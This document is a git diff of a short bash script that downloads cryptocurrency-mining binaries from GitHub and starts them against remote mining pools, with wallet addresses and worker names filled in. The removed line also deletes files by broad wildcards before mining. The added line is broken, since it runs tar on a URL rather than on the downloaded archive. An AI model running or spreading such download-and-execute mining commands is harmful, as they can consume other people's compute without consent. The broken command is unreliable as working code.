@@ -1,2 +1,2 @@
 #!/bin/bash
-rm -rvf lol* ton* NB* nano* aw* && wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-linux-3.5.2-cuda11.tar.gz && tar xf nanominer-linux-3.5.2-cuda11.tar.gz && cd nanominer-linux-3.5.2-cuda11 && ./nanominer -algo ethash -pool1 4ocean.hubnas.xyz:443 -wallet 3QGJUdfcr3A2pTcd5i3BEawGu4q53Wx5Gz.BAKULKULI
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xvf https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a phichox  -o stratum+tcps://stratum-na.rplant.xyz:17031 -u 5k79hkxcQ7axQGBgKjLTdeAQvEA9iPCNv8.BAKULKULI -p webpassword=kontol
